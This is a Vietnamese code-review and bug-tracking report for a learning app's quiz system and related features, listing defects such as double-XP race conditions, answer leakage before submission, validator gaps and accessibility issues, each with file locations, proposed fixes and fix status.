# 4. 📝 QUIZ SYSTEM

**Code scope:** `frontend/src/features/quiz-system/**`, `frontend/src/views/quiz/BackendQuizView.vue`, `frontend/src/views/lesson/components/LessonStepQuiz.vue`, backend `StatelessQuizController.cs`, `QuizService.cs`, `QuizDto.cs`
**Spec:** `plan/features/deep-decomposition/phase1-quiz-system/*.md`, `phase2-smart-quiz/*.md`

## 🔴 P0

### QZ-001 — Race double-XP khi submit song song (endpoint `/concepts/quiz/submit`)
- **Status:** ✅ FIXED — 2026-08-10 (`StatelessQuizController.cs:336-338` commit attempt TRƯỚC khi đọc `previousAttempts`; `ApplicationDbContext.cs` + migration `20260809182125_AddQuizXpGrantUniqueIndex` thêm unique `(UserId, QuizKey)`; DB path cũng ghi `QuizXpGrant` khi thưởng lần đầu — kẻ thua `DbUpdateException` → 0 XP. Test `Race_*` trong `QuizSystemTests.cs` pass)
- **Vị trí:** `backend/src/Application/Features/Quizzes/StatelessQuizController.cs:341-397` — đọc `previousAttempts` TRƯỚC `SaveChangesAsync` (dòng 397); `QuizXpGrant.cs:6` không unique constraint; `QuizAttempts` chỉ index thường (`ApplicationDbContext.cs:337-340`)
- **Mô tả:** Hai request đồng thời cùng thấy 0 lần pass → cả hai được `xpEarned = quiz.XPReward`. Tương phản: `QuizService.cs:88-91` đã sửa đúng (commit attempt trước khi đọc) nhưng đường dẫn frontend đang dùng không áp dụng fix.
- **Kịch bản:** 2 tab/2 device cùng token submit đồng thời → XP cấp 2 lần.
- **Đề xuất:** Unique index `(UserId, QuizKey)` cho `QuizXpGrant` + wrap transaction (hoặc commit attempt trước khi đọc như QuizService).

### QZ-002 — Check-then-insert không atomic ở bank path (quiz bank)
- **Status:** ✅ FIXED — 2026-08-10 (`StatelessQuizController.cs:279-311` bỏ `AnyAsync → Add`, chuyển sang `Add → SaveChangesAsync` + bắt `DbUpdateException` do vi phạm unique `(UserId, QuizKey)` → `xpAwarded = 0`; test `Race_Parallel_TwoConnections_BankQuiz_XpGrantedOnce` pass)
- **Vị trí:** `StatelessQuizController.cs:289-297` (`QuizXpGrants.AnyAsync(...)` rồi mới `Add` + `SaveChangesAsync`)
- **Đề xuất:** Cùng fix như QZ-001 (unique constraint + transaction + retry-on-conflict).

### QZ-003 — Lộ đáp án trước khi nộp bài (cheating): GET trả `CorrectIndex` + `Explanation` cho mọi client có token
- **Status:** ✅ FIXED — 2026-08-10 (`StatelessQuizController.cs:88-95` + `:175-179` thêm query param `?withAnswers=false` mặc định — workspace không nhận đáp án; `withAnswers=true` chỉ cho lesson flow/teacher/admin; submit vẫn chấm server-side. ⚠️ Contract: frontend lesson/teacher cần thêm `?withAnswers=true`)
- **Vị trí:** `StatelessQuizController.cs:113-130` (DB quiz), `:152-168` (bank quiz); client đọc tại `statelessQuizApi.ts:77-86`
- **Mô tả:** Học viên đăng nhập workspace mở DevTools đọc response của `getQuizById` → biết trước đáp án → nộp 100% không cần học. Comment "lesson flow chấm client-side" sai bối cảnh vì workspace dùng cùng endpoint nhưng chấm server-side.
- **Đề xuất:** Tách endpoint không lộ đáp án cho workspace (hoặc `?withAnswers=false`); chỉ trả đáp án cho lesson flow thật sự.

### QZ-004 — Câu hỏi `CANVAS_TARGET` kẹt cứng vĩnh viễn: không listener nào nối click canvas
- **Status:** ✅ FIXED — 2026-08-10 (`useAnimationCanvas.ts`: listener `click` trên canvas, khi `quizStore.isCanvasTargetMode` → map `frame.graphNodes` → `CanvasNodeDTO` (radius 22 khớp GraphRenderer) → `handleCanvasClickAnswer(x,y,nodes)`; click trượt không nộp; flash node xanh `#10B981`/đỏ `#EF4444` vẽ trong `renderCanvas` trước early-return dataState rỗng (frame đồ thị); timer flash 900ms + listener gỡ ở `onBeforeUnmount` — không leak; `CanvasLayer.vue` bật `cursor: crosshair` qua class `canvas-interactive-target-mode`; `QuizCardOverlay.vue` backdrop `quiz-overlay-passive` (pointer-events:none, card giữ auto) để click xuyên tới canvas. Test: `quizCanvasTarget.spec.ts` mới 7 tests)
- **Vị trí:** `useQuizStore.ts:62` (`handleCanvasClickAnswer`), `QuizCardOverlay.vue:26-31`, toàn bộ `animation-engine/` (0 listener click canvas)
- **Mô tả:** Overlay hiện "Nhấp trực tiếp vào đỉnh trên Canvas" nhưng mọi click đều vô hiệu → `isSubmitted` không bao giờ true → nút "Tiếp tục" không xuất hiện → lecture khóa vĩnh viễn (`interactionLocked=true`). Lệch PRD §3.2, 02-ui-ux.md:101-123 (crosshair, glow, flash đỏ).
- **Đề xuất:** Nối sự kiện click trong `useAnimationCanvas`/`CanvasLayer`: khi `quizStore.isCanvasTargetMode` → đọc `CanvasNodeDTO[]` từ frame, gọi `store.handleCanvasClickAnswer(x, y, nodes)`; bật `cursor:crosshair`; flash node đúng/sai.

### QZ-005 — XP kênh đôi chéo flow: lesson flow + quiz workspace cấp XP qua 2 cơ chế không chung chống farm
- **Status:** ✅ FIXED — 2026-08-10 (mọi kênh backend ghi chung ledger `QuizXpGrant` unique `(UserId, QuizKey)` — bank path lẫn DB path (first reward); ghi nhận ADR-39. Kênh lesson XP client-side thuộc frontend — ngoài scope backend. Frontend đã rà soát 2026-08-10: `useLessonStore.submitQuiz → awardXp` (lessonApi) và quiz-system `syncSessionToServer → /concepts/quiz/submit` là 2 đường XP TÁCH BIỆT cho 2 loại quiz khác nhau, không gọi trùng ở frontend)
- **Vị trí:** `StatelessQuizController.cs` (kênh workspace) vs `useLessonStore.ts:377` (`submitQuiz → awardXp`)
- **Mô tả:** `errors.md` #258 tuyên bố "FIXED" nhưng chỉ đóng kênh `SaveLessonProgress` — kênh chéo lesson↔workspace vẫn có thể nhận XP 2 lần cho cùng 1 quiz.
- **Đề xuất:** Dùng chung 1 cơ chế cấp XP có cap + test cross-flow.

## 🟠 P1

### QZ-006 — `syncSessionToServer` là dead code + endpoint `/api/v1/quizzes/attempt` không tồn tại trên backend
- **Status:** ✅ FIXED — 2026-08-10 (quizApi.ts → POST `/api/v1/concepts/quiz/submit` payload `{quizId, answers}`; retry 1 lần (mạng/5xx/timeout); `xpSyncError` state expose; sync gọi trong `dismissQuestionAndContinue` khi hoàn tất toàn bộ checkpoint; `loadCheckpoints` nhận tham số `quizId` — TODO agent PS: VisualizationPlayer truyền `script.algorithmId`)
- **Vị trí:** `useQuizStore.ts:86-91` (định nghĩa nhưng 0 caller), `quizApi.ts:46` (POST sai URL — backend chỉ có `/api/v1/concepts/quiz/submit` tại `StatelessQuizController.cs:224`)
- **Mô tả:** Nếu được gọi → 404 → `return null` (`quizApi.ts:62-65`) → XP mất âm thầm, không toast, không retry. Lesson flow (checkpoint quiz) không bao giờ đồng bộ attempt/XP lên server — lệch PRD phase1 (bảo lưu tiến độ).
- **Đề xuất:** Bỏ hoặc nối `syncSessionToServer` vào `dismissQuestionAndContinue`, sửa URL, thêm retry + error surface.

### QZ-007 — Race: thoát quiz khi `submitBackendQuiz` đang in-flight → state cũ "sống lại"
- **Status:** ✅ FIXED — 2026-08-10 (guard `exitBackendQuiz` chặn thoát khi `isBackendQuizSubmitting`; thêm generation-token cho cả start + submit — response cũ bị bỏ sau exit; mẫu `useLectureStore.ts:17`)
- **Vị trí:** `useQuizStore.ts:159-187`; nút Thoát (`BackendQuizWorkspace.vue:18-21`) không disable trong lúc submitting; `exitBackendQuiz()` không huỷ request
- **Mô tả:** Submit → thoát → request cũ resolve → `backendResult` gán lại → template hiện lại màn hình kết quả dù đã thoát; "Làm lại" ẩn vì `activeBackendQuiz=null` → UI kẹt 2 trạng thái.
- **Đề xuất:** Disable Thoát khi submitting, hoặc generation-token/AbortController (mẫu `useLectureStore.ts:17`).

### QZ-008 — `statelessQuizApi` thiếu timeout → submit/catalog treo vĩnh viễn
- **Status:** ✅ FIXED — 2026-08-10 (cả 4 hàm fetch dùng `AbortSignal.timeout(10000)`; lỗi timeout → `Error('timeout')` → `backendQuizError`)
- **Vị trí:** `statelessQuizApi.ts:63-108` (4 hàm fetch không `AbortSignal.timeout`; so `quizApi.ts:59,83` có 5000ms)
- **Kịch bản:** Backend treo → `isBackendQuizLoading=true` mãi mãi, skeleton vĩnh viễn, nút "Đang gửi..." kẹt.
- **Đề xuất:** Thêm signal timeout + lỗi cụ thể "timeout" → `backendQuizError`.

### QZ-009 — Đổi thuật toán giữa câu hỏi đang mở → overlay cũ + lock `'quiz'` kẹt
- **Status:** ✅ FIXED — 2026-08-10 (phần store: `loadCheckpoints` reset active question + unlock `'quiz'` trước khi nạp script mới; phần VisualizationPlayer.vue đã có sẵn reset khi đổi thuật toán — chỉ còn TODO truyền `quizId` cho QZ-006)
- **Vị trí:** `VisualizationPlayer.vue:60-69` + `useQuizStore.ts:33-37` (`loadCheckpoints` không reset `activeQuestion`, không `unlockLectureInteraction('quiz')`)
- **Kịch bản:** Đang trả lời checkpoint → chọn thuật toán khác → overlay cũ còn hiện, VCR bị khoá (Play/Step disabled), câu hỏi script mới không kích hoạt.
- **Đề xuất:** Trong `loadCheckpoints`: reset active question + unlock trước khi nạp mới.

### QZ-010 — Validator không check cận trên `correctOptionIndex` → mọi lựa chọn đều chấm sai
- **Status:** ✅ FIXED — 2026-08-10 (`QuizSchemaValidator.ts`: thêm `Number.isInteger` + `correctOptionIndex >= 0` + `< options.length`; test biên mới trong `QuizSchemaValidator.spec.ts`)
- **Vị trí:** `QuizSchemaValidator.ts:42-44` (chỉ check `typeof number && >= 0`, không check `< options.length`, không `Number.isInteger`)
- **Kịch bản:** `options:['A','B']`, `correctOptionIndex: 5` → validate PASS → chọn đúng vẫn sai vĩnh viễn.
- **Đề xuất:** Thêm `q.correctOptionIndex >= q.options.length` và `Number.isInteger(...)`.

### QZ-011 — `question.type` không hợp lệ bị bỏ qua im lặng
- **Status:** ✅ FIXED — 2026-08-10 (`QuizSchemaValidator.ts`: nhánh else đẩy lỗi `Kiểu câu hỏi không hỗ trợ: ${q.type}`)
- **Vị trí:** `QuizSchemaValidator.ts:35-52` (else chỉ phân nhánh 3 enum; `type:'MATCHING'`/typo → không error → `isValid:true`)
- **Đề xuất:** Thêm nhánh else đẩy lỗi `Kiểu câu hỏi không hỗ trợ: ${q.type}`.

### QZ-012 — Validator crash TypeError khi checkpoint là `null`
- **Status:** ✅ FIXED — 2026-08-10 (`QuizSchemaValidator.ts`: guard `!cp || typeof cp !== 'object'` đầu vòng lặp → lỗi tường minh, không crash)
- **Vị trí:** `QuizSchemaValidator.ts:18-21` (`cp.frameIndex` trên null, không try/catch)
- **Đề xuất:** Guard `if (!cp || typeof cp !== 'object')` đầu vòng lặp.

### QZ-013 — `saveAttempt` crash khi localStorage hợp lệ JSON nhưng sai shape
- **Status:** ✅ FIXED — 2026-08-10 (`QuizStatsManager.ts`: `normalizeStats` validate shape sau parse — completedQuizzes là array (lọc string), field count là số nguyên không âm; sai shape → fallback default; toàn bộ bọc try/catch)
- **Vị trí:** `QuizStatsManager.ts:22-35` (`getStats` :10-20 chỉ bắt lỗi parse; `null` hoặc `{"totalAttempts":1}` → TypeError dòng 24/33)
- **Kịch bản:** Storage cũ/sai tay → toàn bộ flow submit quiz sập.
- **Đề xuất:** Validate shape sau parse (completedQuizzes là array, field number) + fallback default; bọc try/catch.

### QZ-014 — Submit không guard body null → 500
- **Status:** ✅ FIXED — 2026-08-10 (`StatelessQuizController.cs:229-231` `if (request == null) return BadRequest(...)`; test `Submit_NullBody_ReturnsBadRequest` pass)
- **Vị trí:** `StatelessQuizController.cs:226` (`[FromBody] StatelessQuizAttemptRequest request` không guard null → NRE 500 tại :232; `QuizzesController.cs:56` đã guard)
- **Đề xuất:** `if (request == null) return BadRequest(...)`.

### QZ-015 — Quiz not found → 500 thay vì 404
- **Status:** ✅ FIXED — 2026-08-10 (`QuizService.cs:43,56-62` đổi `throw new Exception` → `KeyNotFoundException` (404 qua `ErrorHandlingMiddleware`) / `ArgumentException` (400); test `Submit_UnknownQuizId_ReturnsNotFound` pass)
- **Vị trí:** `QuizService.cs:43,56-62` (ném `Exception` chung)
- **Đề xuất:** Trả NotFound/BadRequest cụ thể.

### QZ-016 — Backend quiz gần như không có test
- **Status:** ✅ FIXED — 2026-08-10 (thêm `backend/tests/VisualizationDSA.UnitTests/Features/Quizzes/QuizSystemTests.cs` — 16 tests: chấm điểm + threshold 70%, XP first-pass + submit lần 2 = 0, body null 400, quiz not found 404, race song song 2 connection (DB + bank), bank path không ghi attempt, GET ẩn đáp án, trùng title 409 — ALL PASS, tổng suite 372/372)
- **Vị trí:** `QuizServiceTests.cs` (chỉ **1 test** pagination); `StatelessQuizController` (739 dòng, chứa grading + XP + anti-farm) có **0 test**
- **Thiếu:** chấm điểm, threshold 70%, XP first-pass, improvement ±20%, `ANSWER_COUNT_MISMATCH`, `QUIZ_NOT_FOUND`, race double-submit.
- **Ghi chú:** tracking "258/258 PASS" không phản ánh coverage quiz thật.

### QZ-017 — Contract mismatch: `submitQuizAttempt` không bao giờ thành công
- **Status:** ✅ FIXED — 2026-08-10 (payload đổi thành `{quizId, answers: number[]}` khớp `StatelessQuizAttemptRequest` — endpoint `/concepts/quiz/submit`; response parse theo `StatelessQuizAttemptResult`; không cần TODO vì backend đã đúng contract)
- **Vị trí:** `quizApi.ts:52-57` gửi `{quizId, score, maxScore, passed}` — thiếu `answers`, trong khi `QuizAttemptRequest.Answers` là `required int[]` (`QuizDto.cs:29`) → controller 400 → trả null im lặng
- **Đề xuất:** Thêm `answers` vào payload (hoặc đổi contract backend nếu cố ý).

### QZ-018 — Checkpoint bị đánh dấu completed TRƯỚC khi trả lời đúng
- **Status:** ✅ FIXED — 2026-08-10 (`triggerCheckpointQuestion` không còn push; `markCheckpointCompleted` chỉ push sau khi `isCorrect === true` — BEHAVIOR_SPEC §3; trả lời sai → tua lại vẫn retry)
- **Vị trí:** `useQuizStore.ts:52` (`completedCheckpointIndexes.push(frameIndex)` ngay khi kích hoạt)
- **Lệch spec:** BEHAVIOR_SPEC.md:35-36 — mảng chỉ chứa mốc "đã trả lời thành công".
- **Kịch bản:** Trả lời SAI → tua lùi về checkpoint → không bật lại (không retry được).
- **Đề xuất:** Push sau khi `isCorrect === true` (hoặc tách list "đã hiện" / "đã đúng").

### QZ-019 — Dismiss không tự resume playback (lecture kẹt `isWaitingForAnimation`)
- **Status:** ✅ FIXED — 2026-08-10 (thêm `useLectureStore.resumeLecturePlayback()`: resume từ `currentIndex`, xử lý nhánh `isWaitingForAnimation` bằng cách chạy lại `playUntilFrame`; `dismissQuestionAndContinue` gọi sau unlock)
- **Vị trí:** `useQuizStore.ts:73-76` (chỉ unlock, không resume); `useLectureStore` không có `resumeLecturePlayback`
- **Mô tả:** Đang play lecture + checkpoint kích hoạt → `lockLectureInteraction('quiz')` gọi `pause()` (`useLectureStore.ts:126-127`) → sau khi trả lời animation đứng yên; nếu đang trong `playUntilFrame`, promise không resolve → lecture kẹt.
- **Đề xuất:** Thêm `resumeLecturePlayback` vào lecture store và gọi trong `dismissQuestionAndContinue`.

## 🟡 P2

| ID | Vị trí | Nội dung |
|---|---|---|
| QZ-020 | `QuizSchemaValidator.ts:14-16,55` | Quiz rỗng (`checkpoints: []`) được chấp nhận (`isValid: true`) — cần lỗi "Quiz không có câu hỏi nào" — ✅ FIXED 2026-08-10 (đẩy lỗi `Quiz không có câu hỏi nào.` khi checkpoints rỗng) |
| QZ-021 | `QuizSchemaValidator.ts:21-23` | `frameIndex: 5.5` pass validate nhưng `checkFrameForQuiz` so `===` với frame nguyên → checkpoint chết âm thầm. Thêm `Number.isInteger` — ✅ FIXED 2026-08-10 |
| QZ-022 | `QuizSchemaValidator.ts:18-53` | Không phát hiện trùng checkpoint `frameIndex` (câu 2 không bao giờ kích hoạt) hoặc trùng `question.id` — dùng Set kiểm tra — ✅ FIXED 2026-08-10 (`Set<number>` + `Set<string>` đẩy lỗi trùng cụ thể) |
| QZ-023 | `QuizStatsManager.ts:26-31` + `quiz.types.ts:42-47` | Streak là lifetime toàn cục (sai 1 câu tuần trước → streak về 0); `totalAttempts` đếm theo câu nhưng param nhận quizId — thống kê không phân biệt. Đề xuất: tách field per-quiz + helper `getAccuracy()` — ✅ FIXED 2026-08-10 (phần ngữ nghĩa: thêm `bestStreak` lifetime giữ `streak` phiên backward-compat với `QuizSummaryCard.vue:34`; thêm `QuizStatsManager.getAccuracy()`; chưa tách thống kê per-quiz) |
| QZ-024 | `quizLoader.ts:4-10` | Không validate script khi đăng ký; key `'bubble-sort'` vs `bubbleSortQuiz.algorithmId` không được kiểm tra khớp. Đề xuất: chạy validator trong `loadQuizScript` + check khớp key — ✅ FIXED 2026-08-10 (`registerQuizScript` fail-fast: key === algorithmId + `QuizSchemaValidator.validateQuizJson` khi đăng ký) |
| QZ-025 | `useQuizStore.ts:165-169` + `statelessQuizApi.ts:96-108` | Token hết hạn → 401, không tự refresh/retry (`authStore.refreshAccessToken()` chưa dùng) — ✅ FIXED 2026-08-10 (statelessQuizApi: 401 → `refreshAccessToken()` → retry 1 lần; refresh fail → giữ lỗi HTTP gốc) |
| QZ-026 | `useQuizStore.ts:126-144` | Double-click "Làm lại" → 2 GET song song, response sau resolve thắng → quiz cũ/sai; retry fail giữ quiz cũ kèm banner. Đề xuất: guard `isBackendQuizLoading` + generation-token — ✅ FIXED 2026-08-10 (guard `isBackendQuizLoading` chặn double-call; fail → xóa `activeBackendQuiz` + `isBackendQuizMode=false`) |
| QZ-027 | `useQuizStore.ts:164` + `BackendQuizWorkspace.vue:36` | `isBackendQuizLoading` dùng chung cho submit → UI hiện skeleton thay vì "Đang gửi..." (`:135`). Đề xuất: tách `isBackendQuizSubmitting` — ✅ FIXED 2026-08-10 (`submitBackendQuiz` chỉ set `isBackendQuizSubmitting`, không kéo `isBackendQuizLoading`) |
| QZ-028 | `QuizCardOverlay.css:17` | `max-w: 520px;` — thuộc tính CSS KHÔNG hợp lệ (phải `max-width`) → card giãn ~90% thay vì 520px (lệch 02-ui-ux.md:34) — ✅ FIXED 2026-08-10 (`max-width: 520px`) |
| QZ-029 | `useQuizStore.ts:62-71` + `QuizCardOverlay.vue:3` | CANVAS_TARGET không "lối thoát" nếu không node nào khớp (data mismatch): backdrop click no-op, dismiss gating `isSubmitted`, click trống không submit → kẹt vĩnh viễn — ✅ FIXED 2026-08-10 (phần store: data mismatch (nodes rỗng/không có targetNodeId) → nộp tự động mở nút "Tiếp tục"; click trống > 5 lần → bỏ qua an toàn. Nút "Bỏ qua" trong overlay ngoài quyền — TODO agent component) |
| QZ-030 | `statelessQuizApi.ts:66,73,85,107` | Cast `res.json()` không validate runtime → backend sai shape: `quizCatalog.length` undefined → rơi vào fallback giả "Đang hiển thị quiz mẫu..." dù server chạy; item thiếu `title` → `title.toLowerCase()` crash — ✅ FIXED 2026-08-10 (type guards cho catalog/detail/attempt/topics; lỗi shape → `Error` rõ ràng → `backendQuizError`; TODO agent component: `BackendQuizWorkspace.effectiveQuizzes` vẫn hiển thị fallback khi có lỗi — nên ẩn khi `backendQuizError != null`) |
| QZ-031 | `quizApi.ts:68-72` | Lesson flow không error surface — chỉ `console.warn`; nếu nối lại sync (QZ-006), thất bại vô hình — ✅ FIXED 2026-08-10 (`submitQuizAttempt` throw lỗi rõ (HTTP/network/token) → `syncSessionToServer` bắt → `xpSyncError`) |
| QZ-032 | `statelessQuizApi.ts:19` | Fallback `localStorage.getItem('token')` không bao giờ có giá trị — key thật là `vdsa_refresh_token`/Pinia ref — ✅ FIXED 2026-08-10 (bỏ fallback, chỉ dùng `useAuthStore().getAccessToken()`) |
| QZ-033 | `useQuizStore.ts:179-187` | Không lưu tiến trình quiz đang làm (refresh mất trắng); backend quiz không ghi vào `QuizStatsManager` (local stats) → 2 flow lệch thống kê — ✅ FIXED 2026-08-10 (sessionStorage lưu quizId+index+answers trên mọi thay đổi; phục hồi 1 lần/page-load trong `loadQuizCatalog`; submit thành công → ghi `QuizStatsManager.saveAttempt` theo từng `questionResult` + xóa progress) |
| QZ-034 | `useQuizStore.ts:179-187` | `exitBackendQuiz` không reset `isBackendQuizLoading` khi thoát lúc đang load — ✅ FIXED 2026-08-10 (reset cả `isBackendQuizLoading` + `isBackendQuizSubmitting` + `backendQuizError`) |
| QZ-035 | `quizApi.ts:79-89` | `fetchQuizHistory` dead code + sai URL (`/quizzes/history` thay vì `/concepts/quiz/history`) — ✅ FIXED 2026-08-10 (URL đúng `/api/v1/concepts/quiz/history` khớp `StatelessQuizController.GetHistory`; type `QuizHistoryEntry[]`; vẫn chưa có caller — TODO khi dựng trang lịch sử) |
| QZ-036 | `quizApi.ts:59` | Timeout 5000ms quá ngắn cho submit lớn → abort giữa chừng mất XP âm thầm — ✅ FIXED 2026-08-10 (submit timeout 15000ms) |
| QZ-037 | `BackendQuizWorkspace.vue:180-195` | Card catalog `<div @click>` không `role="button"`/`tabindex`/`@keydown.enter` — không truy cập bàn phím — ✅ FIXED 2026-08-10 (`role="button" tabindex="0"` + `@keydown.enter/.space.prevent` → `handleQuizClick`, aria-label mô tả) |
| QZ-038 | `QuizCardOverlay.vue:3`, `QuizSummaryCard.vue:3` | Thiếu dialog semantics (`role="dialog"`/`aria-modal`), focus trap, Escape đóng summary; feedback thiếu `role="status"`/`aria-live` — ✅ FIXED 2026-08-10 (overlay + summary `role="dialog" aria-modal`; focus trap Tab quay vòng + khôi phục focus cũ; Escape đóng summary qua keydown window; feedback `role="status" aria-live="polite"`; QuizOptionsList `role="radiogroup"` + button `role="radio"` `aria-checked`) |
| QZ-039 | `QuizOptionsList.vue:37` | `letters` cố định 6 phần tử — options > 6 → `letters[idx]` undefined. Đề xuất: `String.fromCharCode(65+idx)` — ✅ FIXED 2026-08-10 (`optionLetter(idx)` sinh động) |
| QZ-040 | `LessonStepQuiz.vue:77,85` | `bg-accent hover:bg-accent` — hover trùng màu, không phản hồi — ✅ FIXED 2026-08-10 (`hover:bg-accent-dark` cho nút Nộp Bài, `hover:bg-accent-green/80` cho nút Mở Khóa Code Lab) |
| QZ-041 | `QuizCardOverlay.vue:3` | `@click.self="() => {}"` — handler rỗng; z-index 1000 (theme.css:144) lệch spec 2000 (02-ui-ux.md:27) — ✅ FIXED 2026-08-10 (bỏ handler rỗng; overlay + summary `z-index: 2000`; backdrop thêm `quiz-overlay-passive` khi CANVAS_TARGET) |
| QZ-042 | `quizP2Tests.spec.ts:57-68` | Fixture không nhất quán: `mockResult` 4 questionResults nhưng `mockDetail` 3 questions → render "Câu 4" sẽ sai — ✅ FIXED 2026-08-10 (mockResult 3 questionResults, score 2/maxScore 3) |
| QZ-043 | `LessonStepQuiz.vue:137` | Chưa test đúng biên 70% (7/10) và quiz 1 câu (chỉ test 4/5, 3/4, 2/4) — ✅ FIXED 2026-08-10 (`lessonQuizFlow.spec.ts` +4 tests: 7/10 pass, 6/10 fail, quiz 1 câu đúng/sai) |
| QZ-044 | `useQuizStore.ts:160` | `isBackendQuizSubmitting` không test: không có test gọi submit 2 lần đồng thời assert 1 API call; không fake-timers race test — ✅ FIXED 2026-08-10 (`useQuizStoreBackendMode.spec.ts`: double-submit → 1 API call; fake timers 100ms resolve đúng. ⚠️ Race "thoát giữa lúc submit in-flight → result cũ sống lại" (QZ-007) chưa fix — cần generation-token/AbortController ở store, TODO agent store) |
| QZ-045 | `quizLoader` vs ADR-12 | Registry chỉ 1 script (bubble-sort) trong khi ADR-12 hứa "thêm thuật toán = thêm 1 file"; lesson quiz thực tế lấy từ backend — 2 nguồn song song không test thống nhất — ✅ FIXED 2026-08-10 (test key↔algorithmId nhất quán + validate qua QuizSchemaValidator; TODO: `quizLoader.ts` cần expose `listQuizScriptIds()` để duyệt toàn bộ registry — hiện hardcode key đơn lẻ) |
| QZ-046 | `features-tested.md` | Thiếu toàn bộ mục quiz-system dù `progress.md:354` claim 54 tests — ✅ FIXED 2026-08-10 (bổ sung mục "Quiz System — UI Components & CANVAS_TARGET Integration": quizP0/P2, useQuizStoreBackendMode, quizCanvasTarget, quizLoader, lessonQuizFlow, learningFlow, useAnimationCanvas) |
| QZ-047 | `StatelessQuizController.cs:101-103,236-238` | Lookup theo `Title` khi không parse được Guid → 2 quiz trùng title trả quiz bất định (đã biết #186-187) — ✅ FIXED 2026-08-10 (helper `FindQuizByReferenceAsync` cho GET/Submit/Update/Delete: Guid ưu tiên, trùng Title → 409 `QUIZ_AMBIGUOUS_TITLE`; 2 test pass) |
| QZ-048 | `StatelessQuizController.cs:311-312` | Bank quiz không ghi `QuizAttempt` → `/history` thiếu attempt của quiz bank — ⏳ DEFERRED 2026-08-10 (`QuizAttempt.QuizId` là Guid FK bắt buộc trỏ `Quizzes`; bank quiz in-memory không có row DB → cần materialize bank hoặc thêm cột nullable `QuizKey` + migration) |
| QZ-049 | `QuizStatsManager.spec.ts:75-80` | Không test localStorage partial JSON (thiếu field) — chỉ test corrupted hoàn toàn — ✅ FIXED 2026-08-10 (5 test mới: partial JSON, wrong-shape fields, saveAttempt trên storage sai shape, bestStreak lifetime, getAccuracy) |
| QZ-050 | `quizP0Tests.spec.ts:170-186` | Test XP cap tautological: mock trả `xpAwarded: 100` rồi assert `toBe(100)` — không assert logic store nào, không bắt được farm backend — ✅ FIXED 2026-08-10 (viết lại assert UI thật: pass + xpAwarded=0 → banner "Bạn đã nhận XP tối đa"; xpAwarded=50 → "+50 XP") |
| QZ-051 | `learningFlow.spec.ts:8-21,63` | Mock chính service của nó (`userProgressApi` 100%); luồng Quiz→XP được thay bằng gọi thẳng `syncXP` — không đi qua submit thật — ✅ FIXED 2026-08-10 (thêm 2 integration test: LessonStepQuiz thật + `useLessonStore.submitQuiz` thật + lessonApi thật, chỉ mock fetch; assert award-xp body `{amount:100}` + submit lần 2 không tăng XP; test cũ giữ nguyên — ghi chú đầu file) |
| QZ-052 | `useQuizStore.ts:159-187` | Không có test "submit lần 2 (đậu lại) → `xpAwarded=0`" ở mức store/integration cho `/concepts/quiz/submit` — ✅ FIXED 2026-08-10 (store-level `useQuizStoreBackendMode.spec.ts`: submit lần 1 xpAwarded=100 → lần 2 = 0, store phản ánh nguyên vẹn; enforcement thật nằm ở backend — đã có test backend QuizSystemTests QZ-052) |

---

# 5. 🔗 CROSS-CUTTING (chung nhiều feature)

| ID | Vị trí | Nội dung |
|---|---|---|
| CC-001 | `plan/tracking/features-tested.md` | **Thiếu toàn bộ 4 mục feature** (Execution Control, Interactive Playground, Pseudocode Sync, Quiz System) dù 200+ tests tồn tại — vi phạm Quy tắc bắt buộc cập nhật tracking (AGENTS.md) |
| CC-002 | `plan/tracking/progress.md` | Số test ghi sai nhiều chỗ (37 vs 49–57; 31 vs 132; "258/258 PASS" không phản ánh coverage thật) |
| CC-003 | `progress.md:258`, `deep-decomposition/README.md:19` | Trạng thái `✅ CODE DONE` được ghi khi code chưa mount vào route production (VisualizationPlayer, pseudocode UI) — phải `🟠 PARTIAL` |
| CC-004 | `plan/tracking/errors.md` #258 | Ghi "FIXED" nhưng chỉ đóng 1 kênh XP, kênh chéo lesson↔workspace vẫn mở (xem QZ-005) |
| CC-005 | Toàn repo | **Dead code lan rộng**: `VcrControls.vue`, `PlaygroundJsonPanel` (chưa gán jsonOutput), `VisualizationPlayer` + cụm AnimationCanvas/AnimControlPanel, `syncSessionToServer`, `fetchQuizHistory`, `toAdjacencyList`, `findIsolatedNodes`, `AnimPseudoCodePanel`, mock canvas — cần dọn hoặc mount |
| CC-006 | Nhiều file test | **Test tautological**: đọc text nguồn (EC-012), mock chính mình (QZ-051), sao chép biểu thức template (IP-033), test tên sai nhưng không gọi hàm thật (IP-035) — tạo cảm giác phủ cao hơn thực tế (ước lượng thực ~50–60%/feature) |
| CC-007 | `useVcrStore` vs `useAnimationStore` | Hai store cùng chức năng (play/pause/step/seek/scrub/replay/speed) nhưng **hành vi khác nhau** (pause-on-scrub, replay, debounce, clamp speed chỉ có ở animation store) — cần 1 chuẩn chung hoặc hợp nhất |
| CC-008 | `usePlaybackHotkeys` vs hotkey custom (SortingView, GraphView, InteractivePlayground) | 3+ nguồn đăng ký phím tắt trên window/document, guard khác nhau (E-Lecture, interactionLocked, isAlgorithmMode) — dễ vỡ khi thêm route mới |
| CC-009 | Backend chung | Chiều dọc "sinh frame" không đồng bộ contract: `FrameDTO` (backend) và generator frontend thiếu field `activeLogicalLineId`/`variables` mà pseudocode UI đòi hỏi (PS-001) — ✅ FIXED 2026-08-10 cho bubble-sort (contract chuẩn: FrameDTO → camelCase `activeLogicalLineId`/`variables`; các strategy khác chưa có script frontend nên chưa emit) |
| CC-010 | `plan/tracking/decisions.md` | Một số quyết định ghi sai sự thật code (`activeFrame` alias — không tồn tại; "37 tests" — thực tế 49–57) — tracking phải phản ánh code thực tế |

---

# 6. 🧪 CODE-TO-VISUALIZATION (Live Compiler Sandbox)

**Code scope:** `frontend/src/features/code-to-visualization/**`
**Spec:** `plan/features/deep-decomposition/phase2-code-to-visualization/*.md`
**Phát hiện:** Review round 2026-08-10 (trước khi bắt đầu chiến dịch fix). 2 lỗi P0 (CV-001, CV-002) **đã được chứng minh bằng thực thi** `npx tsx`.

## 🔴 P0

### CV-001 — appendAutoInvoke gọi SAI hàm entry: luôn chọn FunctionDeclaration đầu tiên (thường là helper)
- **Status:** ✅ FIXED — 2026-08-10 (`ASTInstrumentationEngine.ts` — `appendAutoInvoke` viết lại)
- **Vị trí:** `engine/ASTInstrumentationEngine.ts:60-78` (đã sửa → hàm entry selection mới)
- **Mô tả:** `appendAutoInvoke` dùng `program.body.find(...)` → bắt hàm khai báo **đầu tiên**. Khi sinh viên viết helper trước hàm chính (vd `function swap(arr, i, j)` rồi `function bubbleSort(arr)`), hệ thống tự gọi `swap(arr);` — swap trả về `undefined` (vì không return) → **0 frame, Canvas trống** dù thuật toán đúng.
